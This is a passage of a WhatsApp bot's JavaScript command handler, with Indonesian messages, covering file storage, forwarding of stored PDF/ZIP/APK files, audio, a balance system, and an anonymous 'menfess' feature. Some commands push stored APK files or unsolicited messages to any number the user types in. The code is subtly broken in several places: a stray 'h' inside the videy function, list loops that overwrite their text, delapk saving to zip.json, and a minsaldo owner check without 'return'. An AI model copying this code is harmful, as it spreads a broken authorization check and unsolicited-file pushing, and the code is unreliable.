    case 'deleteppbot': case 'delppbot': {
    if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(`Khusus Finsii`)
    await KhaerulZx.removeProfilePicture(KhaerulZx.user.id)
    reply(`Success in deleting bot's profile picture`)
    }
    break
    case 'setcmd': {
    if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
m.reply(`Done!`)
}
break
//=================================================//
case 'delcmd': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
if (!m.quoted) throw 'Reply Pesan!'
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.data.sticker[hash]
m.reply(`Done!`)
}
break
//=================================================//
case 'listcmd': {
if (banned.includes(m.sender)) {
    return;
    }
let teks = `list cmd`
KhaerulZx.sendText(from, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case 'addpdf':{
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama pdf apa')
let teks = `${text}`
{
if (docunye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./database/Docu/${teks}.pdf`)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Pdf\nCek dengan cara ${prefix}listpdf`)
}
}
break
//=================================================//
case 'delpdf':{
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan query')
let teks = `${text}`
{
if (!docunye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = docunye.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(`./database/Docu/${teks}.pdf`)
reply(`Sukses delete pdf ${teks}`)
}
}
break
//=================================================//
case 'listpdf': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
let teksoooo = '┌──⭓「 *LIST PDF* 」\n│\n'
for (let x of docunye) {
teksoooo = `│⭔ ${x}\n`
}
teksoooo = `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf ${botname} + sbuy reply pesan target* \n\n Contoh 2 : yopdf ${botname}`
m.reply(teksoooo)
}
break
//=================================================//
case 'yopdf':{
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
let teks = `${text}`
{
KhaerulZx.sendMessage(from, { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break
//=================================================//
case 'sendpdf': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listpdf`)
let teks = `${text}`
{
KhaerulZx.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Pdf Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addzip':{
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama zip apa')
let teks = `${text}`
{
if (zipnye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
zipnye.push(teks)
await fsx.copy(delb, `./database/zip/${teks}.zip`)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan zip\nCek dengan cara ${prefix}listzip`)
}
}
break
//=================================================//
case 'delzip':{
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
if (!zipnye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = zipnye.indexOf(teks)
zipnye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(`./database/zip/${teks}.zip`)
reply(`Sukses delete zip ${teks}`)
}
}
break
//=================================================//
case 'listzip': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
let teksooooo = '┌──⭓「 *LIST ZIP* 」\n│\n'
for (let x of zipnye) {
teksooooo = `│⭔ ${x}\n`
}
teksooooo = `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip ${botname} + sambil reply pesan target* \n\n Contoh 2 : yozip ${botname}`
m.reply(teksooooo)
}
break
//=================================================//
case 'yozip':{
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
KhaerulZx.sendMessage(from, { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break
//=================================================//
case 'sendzip': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
KhaerulZx.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Zip Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addapk':{
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama apk apa')
let teks = `${text}`
{
if (apknye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./database/apk/${teks}.apk`)
fs.writeFileSync('./database/apk.json', JSON.stringify(apknye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan apk\nCek dengan cara ${prefix}listapk`)
}
}
break
//=================================================//
case 'delapk':{
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
if (!apknye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = apknye.indexOf(teks)
apknye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(apknye))
fs.unlinkSync(`./database/apk/${teks}.apk`)
reply(`Sukses delete Apk ${teks}`)
}
}
break
//=================================================//
case 'listapk': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
let teksoooooo = '┌──⭓「 *LIST APK* 」\n│\n'
for (let x of apknye) {
teksoooooo = `│⭔ ${x}\n`
}
teksoooooo = `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk ${botname} + sambil reply pesan target* \n\n Contoh 2 : yoapk ${botname}`
m.reply(teksoooooo)
}
break
//=================================================//
case 'yoapk':{
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
KhaerulZx.sendMessage(from, { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break
//=================================================//
case 'sendapk': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
KhaerulZx.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Apk Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addvn':{
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama audionya apa')
if (vnnye.includes(text)) return reply("Nama tersebut sudah di gunakan")
let delb = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
vnnye.push(text)
await fsx.copy(delb, `./database/Audio/${text}.mp3`)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break
//=================================================//
case 'delvn':{
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan query')
if (!vnnye.includes(text)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = vnnye.indexOf(text)
vnnye.splice(wanu, 1)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(`./database/Audio/${text}.mp3`)
reply(`Sukses delete vn ${text}`)
}
break
//=================================================//
case 'listvn':{
if (banned.includes(m.sender)) {
    return;
    }
 let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
for (let x of vnnye) {
teksooo += `│⭔ ${x}\n`
}
reply(teksooo)
}
break
//=================================================//
case 'addmsg': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
 if (!m.quoted) throw 'Reply Pesan Yang Ingin Disave Di Database'
 if (!text) throw `Example : ${prefix + command} nama file`
 let msgs = global.db.data.database
 if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
 msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'

Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
}
break
//=================================================//
case 'sendlist': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
 if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
 KhaerulZx.copyNForward(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", msgs[text.toLowerCase()], true)
 m.reply(`Sukses Mengirim Pesan Ke ${m.quoted.sender}`)
}
break
//=================================================//
case 'listmsg': {
if (banned.includes(m.sender)) {
    return;
    }
 let msgs = global.db.data.database
let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
let teks = '「 LIST DATABASE 」\n\n'
for (let i of seplit) {
teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
}
m.reply(teks)
}
break
//=================================================//
case 'delmsg': case 'deletemsg': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('*Khusus Premium*')
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
delete msgs[text.toLowerCase()]
m.reply(`Berhasil menghapus '${text}' dari list pesan`)
}
break
//=================================================//
case 'getmsg': {
if (banned.includes(m.sender)) {
    return;
    }
 if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
 KhaerulZx.copyNForward(from, msgs[text.toLowerCase()], true)
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
 haikalgans = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await KhaerulZx.sendMessage(from, { audio: haikalgans, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/62895392968503',
title: `Finsii`,
sourceUrl: `https://wa.me/+62895392968503`, 
thumbnail: thumb
}
}})
break
case 'minsaldo':
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) m.reply(mess.OnlyOwner)
if (!q.split(",")[0]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) < q.split(",")[1] && cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) !== 0) return m.reply(`Dia saldonya ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)}, jadi jangan melebihi ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)} yah kak🙏`)
minSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
await sleep(50)
m.reply(`「 *SALDO USER* 」
⭔ID: ${q.split(",")[0]}
⭔Nomer: @${q.split(",")[0]}
⭔Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
break
case 'addsaldo':{
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return m.reply('F')
if (!q.split(",")[0]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
addSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
await sleep(50)
m.reply(`「 *SALDO USER* 」
⭔ID: ${q.split(",")[0]}
⭔Nomer: @${q.split(",")[0]}
⭔Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
}
break
case 'ovo':{
if (banned.includes(m.sender)) {
    return;
    }
reply('Pay Ovo : 088973380122\nKirim Ss Bukti Dengan Cara .bukti ovo 1000')
}
break
case 'gopay':{
if (banned.includes(m.sender)) {
    return;
    }
reply ('Pay Gopay : 088973380122\nKirim Ss Bukti Dengan Cara .bukti Gopay 10000')
}
break
case 'saldo':{
if (banned.includes(m.sender)) {
    return;
    }
m.reply(`*━━ CHECK YOUR INFO ━━*

 _• *Name:* ${pushname}_
 _• *Nomer:* ${sender.split('@')[0]}_
 _• *Saldo:* Rp${toRupiah(cekSaldo(sender, db_saldo))}_

*Note :*
_Saldo hanya bisa untuk buysrv_
_Tidak bisa ditarik atau transfer_!`)
}
break
case 'limit-cek':{
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply('Anda balum terdaftar\nsilahkan ketik .daftar')
reply('*Your Limit:* ' + (db.data.users[m.sender].limit))
}
break
case 'jadigta' : {
if (banned.includes(m.sender)) {
    return;
    }
if (!isPrem) return reply('khusus prem')
if (!quoted) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
try {
reply(mess.wait)
const media = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh (media)
KhaerulZx.sendMessage(m.chat, { image: { url: `https://widipe.com/jadigta?url=${anu}` }, caption: 'Selesai'}, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break
case 'removebg':
if (banned.includes(m.sender)) {
    return;
    }
  if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *reply/kirim gambar dengan caption .removebg*`)
  if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .removebg*`)
  if (/image/.test(mime)) {
m.reply(mess.wait)
  let mee = await KhaerulZx.downloadAndSaveMediaMessage(quoted)
  let TelegraPh = require('./lib/uploader')
  let mem = await TelegraPh(mee)
  let shannz = await (await fetch(`https://widipe.com/removebg?url=${mem}`)).json()
  let bg = shannz.result.image
  KhaerulZx.sendMessage(m.chat,{image:{url: bg }, caption: '*SUCCESS* ✅'},{quoted: m})
}
break
case 'apkdl':
if (banned.includes(m.sender)) {
    return;
    }
  if (!text) return m.reply('*masukkan nama aplikasi yang ingin diunduh?*')
  try {
    m.reply('*Process Taking, mungkin membutuhkan waktu yang lama sesuai dengan ukuran aplikasi!*')
  let apk = await (await fetch('https://api.shannmoderz.xyz/downloader/aptoide?id=' + text)).json();
  let app = apk.result;
  KhaerulZx.sendMessage(m.chat, { document: { url: app.link }, fileName: app.appname + '.apk', mimetype: 'application/xapk', caption: `*Developers By :* ${app.developer}`}, { quoted: m })
} catch (e) {
    m.reply('*terjadi error :* ' + e)
}
break
/*
FITUR CREATED BY SELL
WALAU CUMA NGEGABUNGIN AJA
SORRY MASIH PEMULA:>
*`SUMBER`*
https://whatsapp.com/channel/0029VagBdZ49MF92BygaM53t
*/
case 'videy' : {
if (banned.includes(m.sender)) {
    return;
    }
if (!args[0]) {
    return m.reply(`• Contoh: ${prefix + command} https://videy.co/`);
  }
async function videy(url) {
	return new Promise(async (resolve, reject) => {
		try {
			const res = await axios(`${url}`, { method: 'get' });
			const $ = cheerio.load(res.data);
			const video = $('source[type="video/mp4"]').attr('src');
			if (video) {
				resolve(video);
			} else {
				throw new Error('Video source not found');
			}
		} catch (error) {
			reject(`Error while fetching the URL: ${error.message}`);
h		}
	});
}
  if (!/^http(s):\/\/videy\.co/i.test(args[0])) {
    return m.reply('Link Invalid');
  }

  try {
    let result = await videy(args[0]);
    await KhaerulZx.sendMessage(m.chat, { video: { url: result }, caption: "Done" }, { quoted: m });
  } catch (error) {
    console.log(error);
    throw new Error(error);
  }
}
break
case 'lyrics-search': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!text) return reply(`Contoh penggunaan: ${prefix}lyrics Thunder`);
    reply(mess.wait);

    const hasil = await fetchJson(`https://widipe.com/lirik?text=${encodeURIComponent(text)}`);
    const xeonlirik = `
*Title :* ${hasil.result.title}
*Artis :* ${hasil.result.artist}
*Url :* ${hasil.result.url}
*Lyrics :* ${hasil.result.lyrics}
`.trim();
    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                imageMessage: (await prepareWAMessageMedia({ 
                    image: fs.readFileSync('./RulMedia/image/KhaerulZx.jpg') 
                }, { upload: KhaerulZx.waUploadToServer })).imageMessage,
                extendedTextMessage: {
                    text: xeonlirik,
                    footer: botname,
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '120363247886007681@newsletter',
                            newsletterName: ownername,
                            serverMessageId: 143
                        }
                    }
                }
            }
        }
    }, { quoted: m });

    return await KhaerulZx.relayMessage(m.chat, msg.message, {});
}
break;
/*
            case 'lirik2':
            case 'lyrics2': {
            if (banned.includes(m.sender)) {
    return;
    }
if (!text) return reply(`What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`)
reply(mess.wait)
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
const xeonlirik = `
*Title :* ${result.title}
*Author :* ${result.author}
*Url :* ${result.link}

*Lyrics :* ${result.lyrics}

`.trim()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xeonlirik
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./RulMedia/image/KhaerulZx.jpg')}, { upload: KhaerulZx.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363247886007681@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await KhaerulZx.relayMessage(m.chat, msgs.message, {})
}
break*/
case 'resetlimit': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(mess.owner)
let list = Object.entries(global.db.data.users)
	let lim = !args || !args[0] ? 500 : isNumber(args[0]) ? parseInt(args[0]) : 100
	lim = Math.max(1, lim)
	list.map(([user, data], i) => (Number(data.limit = lim)))
		KhaerulZx.sendMessage(m.chat, {text: `*Limit berhasil direset ${lim} / user*`}, { quoted: m })
		}
break

case 'addlimit': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(mess.owner)
if (!text) return reply('Masukkan Jumlah Limit Yang Akan Diberi')
    let who
    if (m.isGroup) who = m.mentionedJid[0]
    else who = m.chat
    if (!who) throw reply('Tag Orangnya')
    let txt = text.replace('@' + who.split`@`[0], '').trim()
    if (isNaN(txt)) throw reply('Hanya Angka')
    let poin = parseInt(txt)
    let limit = poin
    if (limit < 1) throw reply('Minimal 1')
    let user = global.db.data.users
    user[who].limit += poin
    if (limit > 9999999) return reply('Jangan Banyak² Jir 😂') 
    KhaerulZx.sendMessage(m.chat, {text: `Selamat @${who.split`@`[0]}. Kamu Mendapatkan +${poin} Limit!`}, {quoted:m})
    }
break
case 'confess': case 'confes': case 'menfes': case 'menfess':{
if (banned.includes(m.sender)) {
    return;
    }
if (m.isGroup) return reply('Fitur Hanya Dapat Digunakan Di Private Chat Bot!')
KhaerulZx.menfes = KhaerulZx.menfes ? KhaerulZx.menfes : {}
roof = Object.values(KhaerulZx.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (roof) return reply("Kamu masih berada dalam sesi menfess\n\nsilahkan ketik .stopmenfes untuk mengakhiri sesi menfes")
if (!text) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n\nMasih tidak paham? berikut link video tutorialnya : https://videy.co/v?id=B5WRJO2h`)
if (!text.includes('|')) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|6292818802718|Menfes nih\n\nNomor tidak boleh ada spasi atau tanda + dan nomor harus berawalan 62`)
let [namaNya, nomorNya, pesanNya] = text.split`|`
if (nomorNya.startsWith('0')) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if(isNaN(nomorNya)) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
var yoi = `Hi ada menfess nih buat kamu\n\nDari : ${namaNya}\nPesan : ${pesanNya}\n\nSilahkan ketik ${prefix}balasmenfess -- Untuk menerima menfess/confess\nSilahkan ketik ${prefix}tolakmenfess -- Untuk menolak menfess/confess\n\n_Pesan ini di tulis oleh seseorang pengguna bot, bot hanya menyampaikan saja_`
let tod = await getBuffer('https://telegra.ph/file/c8fdfc8426f5f60b48cca.jpg') 
let id = m.sender
KhaerulZx.menfes[id] = {
id,
a: m.sender,
b: nomorNya + "@s.whatsapp.net",
state: 'WAITING'
}
 await KhaerulZx.sendMessage(nomorNya + '@s.whatsapp.net', {image: tod, caption:yoi }, {})
reply('Pesan berhasil dikirim ke nomor tujuan. Moga aja dibales coy')
}
break
case 'balasmenfess': case 'balasmenfes': case 'accmenfess':{
if (banned.includes(m.sender)) {
    return;
    }
if (m.isGroup) return reply('Fitur Hanya Dapat Digunakan Di Private Chat Bot!')
let roof = Object.values(KhaerulZx.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
if (!roof) return reply("Belum ada sesi menfess");
let room = Object.values(KhaerulZx.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING');
if (!room) return reply("Tidak ada sesi menfess yang sedang menunggu");
let other = [room.a, room.b].find(user => user !== m.sender);
room.b = m.sender;
room.state = 'CHATTING';
KhaerulZx.menfes[room.id] = {...room};
await KhaerulZx.sendMessage(other, { 
  text: `_Seseorang telah menerima menfess kamu, ketik .chatfes <pesan kamu> untuk mengirim pesan\n.kirstick (Reply Sticker) untuk mengirim stiker\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess\n\nVideo tutorial membalas pesan menfes : https://videy.co/v?id=B5WRJO2h`, 
  mentions: [m.sender]
});
KhaerulZx.sendMessage(m.chat, { 
  text: `_Menfess telah diterima, ketik :\n.chatfes <pesan kamu> untuk mengirim pesan\n.kirstick (Reply Sticker) untuk mengirim stiker\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess\n\nVideo tutorial membalas pesan menfes : https://videy.co/v?id=B5WRJO2h`
});
}
break
 case 'tolakmenfess': case 'tolakmenfes': case 'rejecmenfess':{
 if (banned.includes(m.sender)) {
    return;
    }
if (m.isGroup) return reply('Fitur Hanya Dapat Digunakan Di Private Chat Bot!')
roof = Object.values(KhaerulZx.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return reply("Belum ada sesi menfess")
let room = Object.values(KhaerulZx.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find = Object.values(KhaerulZx.menfes).find(menpes => menpes.state == 'WAITING')
